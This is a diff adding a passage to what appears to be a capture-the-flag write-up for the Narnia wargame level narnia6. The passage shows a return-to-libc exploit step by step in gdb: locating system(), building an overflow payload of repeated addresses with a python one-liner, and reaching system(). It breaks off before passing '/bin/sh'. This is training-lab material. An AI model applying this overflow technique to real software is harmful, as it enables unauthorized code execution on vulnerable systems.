@@ -200,3 +200,30 @@ Executable memory:
 f7e23000-f7fca000 r-xp 00000000 00:3b 2649                               /lib32/libc-2.19.so
 f7fdb000-f7fdc000 r-xp 00000000 00:00 0                                  [vdso]
 f7fdc000-f7ffc000 r-xp 00000000 00:3b 2644                               /lib32/ld-2.19.so
+
+Would you look at that, libc is in the executable address space. A bit of reading pointed me to a technique called "Return to libc".
+Essentially to accomplish this you need to point eip to one of the many functions in libc, and in this case we can pass a parameter...
+system("/bin/sh") is probably what we want here given the definition "int system(const char *cmd);"
+
+First we need the address of the system() function, in gdb:
+
+(gdb) print system
+$5 = {<text variable, no debug info>} 0xf7e62e70 <system>
+
+Thank god no one is using aslr here, that address should stay useful for a while ;)
+Now we modify the payload:
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 BBBBBBBB $(python -c 'print "\x70\x2e\xe6\xf7"*5')
+
+Breakpoint 8, 0xf7e62e70 in system () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+sh: 1: p.��p.��p.��: not found
+
+[Inferior 1 (process 906) exited with code 01]
+(gdb) 
+
+Nice! so we are visiting system(), now we need to get the parameter to be "/bin/sh" as per the definition of system()
